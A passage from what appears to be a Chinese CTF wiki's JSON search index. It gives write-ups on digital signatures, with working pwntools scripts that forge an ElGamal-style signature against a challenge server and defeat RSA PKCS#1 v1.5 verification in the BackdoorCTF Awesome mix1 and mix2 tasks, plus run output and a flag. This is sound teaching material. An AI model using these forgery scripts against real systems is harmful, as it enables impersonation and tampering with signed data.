\u90a3\u6211\u4eec\u5982\u4f55\u6784\u9020\u5462\uff1f\u65e2\u7136\u6d88\u606f\u7684\u957f\u5ea6\u53ef\u4ee5\u8db3\u591f\u957f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06'test'\u5bf9\u5e94\u768416\u8fdb\u5236\u5148\u5de6\u79fb\u5f97\u5230\u6bd4p-1\u5927\u7684\u6570\u5b57a\uff0c\u7136\u540e\u7528a\u5bf9p-1\u53d6\u6a21\uff0c\u7528a\u518d\u51cf\u53bb\u4f59\u6570\uff0c\u6b64\u65f6a\u6a21p-1\u4f590\u4e86\u3002\u8fd9\u65f6\u518d\u52a0\u4e0a\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u7684\u503c\uff0c\u5373\u5b9e\u73b0\u4e86\u6a21p-1\u540c\u4f59\u3002 \u5177\u4f53\u5982\u4e0b # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) \u6700\u540e\u7684\u811a\u672c\u5982\u4e0b from pwn import * from hashlib import sha1 import string import ast import os import binascii context . log_level = 'debug' def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' def digitalize ( m ): return int ( m . encode ( 'hex' ), 16 ) sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) sh . recvuntil ( 'Current PK we are using: ' ) pubkey = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) p = pubkey [ 0 ] g = pubkey [ 1 ] pk = pubkey [ 2 ] # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) assert ( victim % ( p - 1 ) == digitalize ( target ) % ( p - 1 )) # get victim signature sh . sendline ( hex ( victim )[ 2 :] . decode ( 'hex' )) sh . recvuntil ( 'Your signature is' ) sig = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) sig = [ int ( sig [ 0 ], 0 ), int ( sig [ 1 ], 0 )] # get flag sh . sendline ( target ) sh . sendline ( str ( sig [ 0 ]) + \",\" + str ( sig [ 1 ])) sh . interactive () \u8fd9\u91cc\u8fd8\u8981\u8bf4\u51e0\u4e2a\u6709\u610f\u601d\u7684\u70b9\u5c31\u662f int(x,0)\u53ea\u7684\u662f\u5c06x\u6309\u7167\u5176\u5b57\u9762\u5bf9\u5e94\u7684\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4int('0x12',0)=18\uff0c\u8fd9\u91cc\u76f8\u5e94\u7684\u5b57\u9762\u5fc5\u987b\u6709\u5bf9\u5e94\u6807\u5fd7\u5f00\u5934\uff0c\u6bd4\u5982\u8bf4\u5341\u516d\u8fdb\u5236\u662f0x,8\u8fdb\u5236\u662f0\uff0c\u4e8c\u8fdb\u5236\u662f0b\u3002\u56e0\u4e3a\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u8bc6\u522b\u4e86\u3002 python(python2) \u91cc\u9762\u5230\u5e95\u591a\u5927\u7684\u6570\uff0c\u8ba1\u7b97\u51fa\u6765\u6700\u540e\u624d\u4f1a\u5e26\u6709L\u5462\uff1f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u4e8eint\u90fd\u4f1a\u6709L\u3002\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684victim\u786e\u5b9e\u662f\u6ca1\u6709\u7684\uff0c\uff0c \u4e00\u4e2a\u95ee\u9898\uff0c\u5f85\u89e3\u51b3\u3002\u3002","title":"\u9898\u76ee"},{"location":"crypto/signature/introduction/","text":"\u6570\u5b57\u7b7e\u540d \u00b6 \u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u6211\u4eec\u5728\u53c2\u52a0\u67d0\u4e2a\u6d3b\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u7b7e\u540d\uff0c\u4ee5\u4fbf\u4e8e\u8bc1\u660e\u6211\u4eec\u786e\u5b9e\u5230\u573a\u4e86\uff0c\uff0c\uff0c\u9632\u6b62\u5bfc\u5458\u5565\u7684\uff0c\u4f60\u61c2\u5f97\u3002\u3002\u3002\u4f46\u5176\u5b9e\u5427\uff0c\u8fd9\u79cd\u7b7e\u540d\u5f88\u5bb9\u6613\u88ab\u4f2a\u9020\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u4eba\u4ee3\u7b7e\u4e00\u4e0b\uff0c\u6216\u8005\u8bf4\u627e\u4e00\u4e2a\u4f1a\u6a21\u4eff\u522b\u4eba\u5b57\u8ff9\u7684\u4eba\u5e2e\u5fd9\u7b7e\u4e00\u4e0b\u3002\u5728\u8ba1\u7b97\u673a\u4e16\u754c\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u7535\u5b50\u7b7e\u540d\uff0c\u56e0\u4e3a\u6211\u4eec\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528\u7535\u5b50\u6587\u4ef6\uff0c\u90a3\u8fd9\u65f6\u5019\u600e\u4e48\u529e\u5462\uff1f\u5f53\u7136\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002\u4f46\u5176\u5b9e\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u90a3\u5c31\u662f\u91c7\u7528\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u79cd\u7b7e\u540d\u66f4\u52a0\u96be\u4ee5\u4f2a\u9020\uff0c\u53ef\u4fe1\u7a0b\u5ea6\u66f4\u9ad8\u3002\u6570\u5b57\u7b7e\u540d\u7684\u4e3b\u8981\u7528\u5904\u662f\u786e\u4fdd\u6d88\u606f\u786e\u5b9e\u6765\u81ea\u4e8e\u58f0\u79f0\u4ea7\u751f\u8be5\u6d88\u606f\u7684\u4eba\u3002 \u6570\u5b57\u7b7e\u540d\uff08digital signature\uff09\u4e3b\u8981\u7528\u4e8e\u5bf9\u6570\u5b57\u6d88\u606f\uff08digital message\uff09\u8fdb\u884c\u7b7e\u540d\uff0c\u4ee5\u9632\u6d88\u606f\u7684\u5192\u540d\u4f2a\u9020\u6216\u7be1\u6539\uff0c\u4ea6\u53ef\u4ee5\u7528\u4e8e\u901a\u4fe1\u53cc\u65b9\u7684\u8eab\u4efd\u9274\u522b\u3002 \u6570\u5b57\u7b7e\u540d\u4f9d\u8d56\u4e8e\u975e\u5bf9\u79f0\u5bc6\u7801\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u4e00\u65b9\u80fd\u591f\u505a\u7684\u4e8b\u60c5\uff0c\u800c\u53e6\u4e00\u65b9\u4e0d\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b \u6570\u5b57\u7b7e\u540d\u5e94\u5f53\u5177\u6709\u4ee5\u4e0b\u51e0\u4e2a\u7279\u6027\uff1a (1) \u7b7e\u540d\u662f\u53ef\u4fe1\u7684\uff1a\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u9a8c\u8bc1\u7b7e\u540d\u7684\u6709\u6548\u6027\u3002 (2) \u7b7e\u540d\u662f\u4e0d\u53ef\u4f2a\u9020\u7684\uff1a\u9664\u4e86\u5408\u6cd5\u7684\u7b7e\u540d\u8005\u4e4b\u5916\uff0c\u4efb\u4f55\u5176\u4ed6\u4eba\u4f2a\u9020\u5176\u7b7e\u540d\u662f\u56f0\u96be\u7684\u3002 (3) \u7b7e\u540d\u662f\u4e0d\u53ef\u590d\u5236\u7684\uff1a\u5bf9\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u4e0d\u80fd\u901a\u8fc7\u590d\u5236\u53d8\u4e3a\u53e6\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u3002\u5982\u679c\u5bf9\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u662f\u4ece\u522b\u5904\u590d\u5236\u5f97\u5230\u7684\uff0c\u5219\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u4e0e\u7b7e\u540d\u4e4b\u95f4\u7684\u4e0d\u4e00\u81f4\u6027\uff0c\u4ece\u800c\u53ef\u4ee5\u62d2\u7edd\u7b7e\u540d\u7684\u6d88\u606f\u3002 (4) \u7b7e\u540d\u7684\u6d88\u606f\u662f\u4e0d\u53ef\u6539\u53d8\u7684\uff1a\u7ecf\u7b7e\u540d\u7684\u6d88\u606f\u4e0d\u80fd\u88ab\u7be1\u6539\u3002\u4e00\u65e6\u7b7e\u540d\u7684\u6d88\u606f\u88ab\u7be1\u6539\uff0c\u5219\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u4e0e\u7b7e\u540d\u4e4b\u95f4\u7684\u4e0d\u4e00\u81f4\u6027\u3002 (5) \u7b7e\u540d\u662f\u4e0d\u53ef\u62b5\u8d56\u7684\uff1a\u7b7e\u540d\u8005\u4e8b\u540e\u4e0d\u80fd\u5426\u8ba4\u81ea\u5df1\u7684\u7b7e\u540d\u3002","title":"\u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/introduction/#_1","text":"\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u6211\u4eec\u5728\u53c2\u52a0\u67d0\u4e2a\u6d3b\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u7b7e\u540d\uff0c\u4ee5\u4fbf\u4e8e\u8bc1\u660e\u6211\u4eec\u786e\u5b9e\u5230\u573a\u4e86\uff0c\uff0c\uff0c\u9632\u6b62\u5bfc\u5458\u5565\u7684\uff0c\u4f60\u61c2\u5f97\u3002\u3002\u3002\u4f46\u5176\u5b9e\u5427\uff0c\u8fd9\u79cd\u7b7e\u540d\u5f88\u5bb9\u6613\u88ab\u4f2a\u9020\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u4eba\u4ee3\u7b7e\u4e00\u4e0b\uff0c\u6216\u8005\u8bf4\u627e\u4e00\u4e2a\u4f1a\u6a21\u4eff\u522b\u4eba\u5b57\u8ff9\u7684\u4eba\u5e2e\u5fd9\u7b7e\u4e00\u4e0b\u3002\u5728\u8ba1\u7b97\u673a\u4e16\u754c\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u7535\u5b50\u7b7e\u540d\uff0c\u56e0\u4e3a\u6211\u4eec\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528\u7535\u5b50\u6587\u4ef6\uff0c\u90a3\u8fd9\u65f6\u5019\u600e\u4e48\u529e\u5462\uff1f\u5f53\u7136\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002\u4f46\u5176\u5b9e\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u90a3\u5c31\u662f\u91c7\u7528\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u79cd\u7b7e\u540d\u66f4\u52a0\u96be\u4ee5\u4f2a\u9020\uff0c\u53ef\u4fe1\u7a0b\u5ea6\u66f4\u9ad8\u3002\u6570\u5b57\u7b7e\u540d\u7684\u4e3b\u8981\u7528\u5904\u662f\u786e\u4fdd\u6d88\u606f\u786e\u5b9e\u6765\u81ea\u4e8e\u58f0\u79f0\u4ea7\u751f\u8be5\u6d88\u606f\u7684\u4eba\u3002 \u6570\u5b57\u7b7e\u540d\uff08digital signature\uff09\u4e3b\u8981\u7528\u4e8e\u5bf9\u6570\u5b57\u6d88\u606f\uff08digital message\uff09\u8fdb\u884c\u7b7e\u540d\uff0c\u4ee5\u9632\u6d88\u606f\u7684\u5192\u540d\u4f2a\u9020\u6216\u7be1\u6539\uff0c\u4ea6\u53ef\u4ee5\u7528\u4e8e\u901a\u4fe1\u53cc\u65b9\u7684\u8eab\u4efd\u9274\u522b\u3002 \u6570\u5b57\u7b7e\u540d\u4f9d\u8d56\u4e8e\u975e\u5bf9\u79f0\u5bc6\u7801\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u4e00\u65b9\u80fd\u591f\u505a\u7684\u4e8b\u60c5\uff0c\u800c\u53e6\u4e00\u65b9\u4e0d\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b \u6570\u5b57\u7b7e\u540d\u5e94\u5f53\u5177\u6709\u4ee5\u4e0b\u51e0\u4e2a\u7279\u6027\uff1a (1) \u7b7e\u540d\u662f\u53ef\u4fe1\u7684\uff1a\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u9a8c\u8bc1\u7b7e\u540d\u7684\u6709\u6548\u6027\u3002 (2) \u7b7e\u540d\u662f\u4e0d\u53ef\u4f2a\u9020\u7684\uff1a\u9664\u4e86\u5408\u6cd5\u7684\u7b7e\u540d\u8005\u4e4b\u5916\uff0c\u4efb\u4f55\u5176\u4ed6\u4eba\u4f2a\u9020\u5176\u7b7e\u540d\u662f\u56f0\u96be\u7684\u3002 (3) \u7b7e\u540d\u662f\u4e0d\u53ef\u590d\u5236\u7684\uff1a\u5bf9\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u4e0d\u80fd\u901a\u8fc7\u590d\u5236\u53d8\u4e3a\u53e6\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u3002\u5982\u679c\u5bf9\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u662f\u4ece\u522b\u5904\u590d\u5236\u5f97\u5230\u7684\uff0c\u5219\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u4e0e\u7b7e\u540d\u4e4b\u95f4\u7684\u4e0d\u4e00\u81f4\u6027\uff0c\u4ece\u800c\u53ef\u4ee5\u62d2\u7edd\u7b7e\u540d\u7684\u6d88\u606f\u3002 (4) \u7b7e\u540d\u7684\u6d88\u606f\u662f\u4e0d\u53ef\u6539\u53d8\u7684\uff1a\u7ecf\u7b7e\u540d\u7684\u6d88\u606f\u4e0d\u80fd\u88ab\u7be1\u6539\u3002\u4e00\u65e6\u7b7e\u540d\u7684\u6d88\u606f\u88ab\u7be1\u6539\uff0c\u5219\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u4e0e\u7b7e\u540d\u4e4b\u95f4\u7684\u4e0d\u4e00\u81f4\u6027\u3002 (5) \u7b7e\u540d\u662f\u4e0d\u53ef\u62b5\u8d56\u7684\uff1a\u7b7e\u540d\u8005\u4e8b\u540e\u4e0d\u80fd\u5426\u8ba4\u81ea\u5df1\u7684\u7b7e\u540d\u3002","title":"\u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/rsa/","text":"RSA \u6570\u5b57\u7b7e\u540d \u00b6 \u539f\u7406 \u00b6 \u539f\u7406\u7c7b\u4f3c\u4e8e RSA \u52a0\u5bc6\uff0c\u53ea\u662f\u8fd9\u91cc\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4f5c\u4e3a\u7b7e\u540d\u3002 2018 Backdoor Awesome mix1 \u00b6 \u9996\u5148\uff0c\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u6e90\u7801\uff0c\u8fd9\u91cc\u7a0b\u5e8f\u4f7f\u7528 PKCS1_V1.5 \u8fdb\u884c\u4e86 RSA \u7b7e\u540d\uff0c\u8fd9\u4f1a\u5bf9\u660e\u6587\u6d88\u606f\u8fdb\u884c\u6269\u5c55\uff0c\u5177\u4f53\u6269\u5c55\u89c4\u5219\u8bf7\u53c2\u8003 https://www.emc.com/collateral/white-papers/h11300-pkcs-1v2-2-rsa-cryptography-standard-wp.pdf \u3002\u8fd9\u91cc\u7ed9\u51fa\u5bf9\u5e94\u6269\u5c55\u811a\u672c\uff0c\u5bf9\u5e94\u4e8e\u9898\u76ee\u4e2d\u7684 from Util import PKCS1_pad as pad def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) \u7a0b\u5e8f\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa n,e \u4f7f\u5f97\u7a0b\u5e8f\u6ee1\u8db3 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 h(m)\uff0cpad(m) \u3002\u663e\u7136\u5982\u679c\u6211\u4eec\u63a7\u5236 e=1 \u7684\u8bdd\uff0c\u90a3\u4e48 h(m)-pad(m)=kn h(m)-pad(m)=kn \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e k=1\uff0c\u65e2\u53ef\u4ee5\u5f97\u5230 n\u3002 \u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./mix1.py \u3002 exp \u5982\u4e0b from Crypto.Hash import SHA from pwn import * from Util import PKCS1_pad #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) e = 1 n = int ( signature , 16 ) - m p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6548\u679c\u5982\u4e0b \u279c 2018 -BackdoorCTF-Awesome-mix1 git: ( master ) python exp.py [ + ] Opening connection to 127 .0.0.1 on port 12345 : Done [ * ] message: super important information for admin only [ * ] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f [ * ] Switching to interactive mode CTF { cryp70_5ur3_15_w13rd } [ * ] Got EOF while reading in interactive 2018 Backdoor Awesome mix2 \u00b6 \u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./service.py \u3002 \u9898\u76ee\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u7684\u9898\u76ee\uff0c\u552f\u4e00\u7684\u533a\u522b\u5728\u4e8e\u5bf9\u4e8e e \u6709\u7ea6\u675f\uff0c\u5fc5\u987b\u5927\u4e8e 3\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 1 \u4e86\u3002 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 h(m)\uff0cpad(m) \u3002\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u5269\u4e0b\u7684\u6570\u5373\u53ef\uff0c\u8fd9\u91cc\u6211\u4eec\u6784\u9020 n \u4e3a\u7d20\u6570\uff0c\u4f7f\u5f97 n-1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528 pohlig_hellman \u7b97\u6cd5\u4e86\u3002 from Crypto.Hash import SHA from pwn import * import gmpy2 from gmpy2 import is_prime import random def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) #context.log_level = 'debug' def gen_smooth_num ( plist , minnum = pow ( 2 , 1020 )): lenp = len ( plist ) while True : n = 1 factors = dict () while n + 1 < minnum : tmp = random . randint ( 0 , lenp - 1 ) n *= plist [ tmp ] if plist [ tmp ] in factors : factors [ plist [ tmp ]] += 1 else : factors [ plist [ tmp ]] = 1 if n . bit_length () > 1024 : continue if is_prime ( n + 1 ): return n + 1 , factors # http://pythonexample.com/snippet/pohligpy_neuratron_python # solve g^x=h mod m def log_prime_power ( g , h , pf , pe , M ): powers = [ pf ** k for k in range ( pe )] gamma = gmpy2 . powmod ( g , powers [ - 1 ], M ) xk = gmpy2 . mpz ( 0 ) for k in range ( pe ): if k == 0 : hk = gmpy2 . powmod ( h , powers [ pe - k - 1 ], M ) else : gk = gmpy2 . powmod ( g , xk * ( M - 2 ), M ) hk = gmpy2 . powmod ( gk * h , powers [ pe - k - 1 ], M ) k_log_found = False for dk in range ( pf ): yk = gmpy2 . powmod ( gamma , dk , M ) if yk == hk : k_log_found = True break if not k_log_found : raise Exception ( \"can not solve\" ) xk += gmpy2 . mul ( powers [ k ], dk ) return xk def pohlig_hellman ( g , h , M , factors ): M1 = M - 1 xs = [] for f in factors : pf = f pe = factors [ f ] subgroup_exponent = gmpy2 . div ( M1 , gmpy2 . powmod ( pf , pe , M )) gi = gmpy2 . powmod ( g , subgroup_exponent , M ) hi = gmpy2 . powmod ( h , subgroup_exponent , M ) xi = log_prime_power ( gi , hi , pf , pe , M ) xs . append ( xi ) crt_coeffs = [] for f in factors : pf = f pe = factors [ f ] mi = pf ** pe bi = gmpy2 . div ( M , mi ) bi_inv = gmpy2 . invert ( bi , mi ) crt_coeffs . append ( gmpy2 . mul ( bi , bi_inv )) x = 0 for i in range ( len ( crt_coeffs )): x = gmpy2 . t_mod ( x + gmpy2 . t_mod ( xs [ i ] * crt_coeffs [ i ], M1 ), M1 ) return x #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) signature = int ( signature , 16 ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) print m , signature plist = [] for i in range ( 2 , 1000 ): if is_prime ( i ): plist . append ( i ) while True : try : n , factors = gen_smooth_num ( plist , signature ) e = pohlig_hellman ( signature , m , n , factors ) except Exception as e : continue else : break print n , e print m print gmpy2 . powmod ( signature , e , n ) p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6709\u4e24\u70b9\u9700\u8981\u6ce8\u610f \u7531\u4e8e g^x=y g^x=y \u4e2d\u7684 g \u548c y \u90fd\u662f\u7ed9\u5b9a\u7684\uff0c\u6211\u4eec\u65b0\u627e\u5230\u7684 n\uff0c\u4e0d\u4e00\u5b9a g \u7684\u5e42\u6b21\u6784\u6210\u7684\u7fa4\u4f1a\u5305\u542b y\uff0c\u6240\u4ee5\u53ef\u80fd\u6c42\u89e3\u5931\u8d25\uff0c\u6240\u4ee5\u9700\u8981\u591a\u6b21\u6c42\u89e3\u3002 \u6e90\u4ee3\u7801\u4e2d\u867d\u7136 n.bit_length() <= 1025 \uff0c\u4f46\u662f\u5176\u5b9e n \u5728\u6ee1\u8db3\u4e0d\u5c0f\u4e8e signature \u7684\u6761\u4ef6\u65f6\uff0c\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff08pycrypto \u6e90\u7801\uff09 modBits = Crypto . Util . number . size ( self . _key . n ) k = ceil_div ( modBits , 8 ) # Convert from bits to bytes # Step 1 if len ( S ) != k : return 0 \u6240\u4ee5\u6211\u4eec\u6700\u597d\u8bbe\u7f6e n \u4e3a1024 \u6bd4\u7279\u4f4d\u3002","title":"RSA \u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/rsa/#rsa","text":"","title":"RSA \u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/rsa/#_1","text":"\u539f\u7406\u7c7b\u4f3c\u4e8e RSA \u52a0\u5bc6\uff0c\u53ea\u662f\u8fd9\u91cc\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4f5c\u4e3a\u7b7e\u540d\u3002","title":"\u539f\u7406"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix1","text":"\u9996\u5148\uff0c\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u6e90\u7801\uff0c\u8fd9\u91cc\u7a0b\u5e8f\u4f7f\u7528 PKCS1_V1.5 \u8fdb\u884c\u4e86 RSA \u7b7e\u540d\uff0c\u8fd9\u4f1a\u5bf9\u660e\u6587\u6d88\u606f\u8fdb\u884c\u6269\u5c55\uff0c\u5177\u4f53\u6269\u5c55\u89c4\u5219\u8bf7\u53c2\u8003 https://www.emc.com/collateral/white-papers/h11300-pkcs-1v2-2-rsa-cryptography-standard-wp.pdf \u3002\u8fd9\u91cc\u7ed9\u51fa\u5bf9\u5e94\u6269\u5c55\u811a\u672c\uff0c\u5bf9\u5e94\u4e8e\u9898\u76ee\u4e2d\u7684 from Util import PKCS1_pad as pad def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) \u7a0b\u5e8f\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa n,e \u4f7f\u5f97\u7a0b\u5e8f\u6ee1\u8db3 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 h(m)\uff0cpad(m) \u3002\u663e\u7136\u5982\u679c\u6211\u4eec\u63a7\u5236 e=1 \u7684\u8bdd\uff0c\u90a3\u4e48 h(m)-pad(m)=kn h(m)-pad(m)=kn \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e k=1\uff0c\u65e2\u53ef\u4ee5\u5f97\u5230 n\u3002 \u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./mix1.py \u3002 exp \u5982\u4e0b from Crypto.Hash import SHA from pwn import * from Util import PKCS1_pad #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) e = 1 n = int ( signature , 16 ) - m p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6548\u679c\u5982\u4e0b \u279c 2018 -BackdoorCTF-Awesome-mix1 git: ( master ) python exp.py [ + ] Opening connection to 127 .0.0.1 on port 12345 : Done [ * ] message: super important information for admin only [ * ] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f [ * ] Switching to interactive mode CTF { cryp70_5ur3_15_w13rd } [ * ] Got EOF while reading in interactive","title":"2018 Backdoor Awesome mix1"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix2","text":"\u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./service.py \u3002 \u9898\u76ee\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u7684\u9898\u76ee\uff0c\u552f\u4e00\u7684\u533a\u522b\u5728\u4e8e\u5bf9\u4e8e e \u6709\u7ea6\u675f\uff0c\u5fc5\u987b\u5927\u4e8e 3\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 1 \u4e86\u3002 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 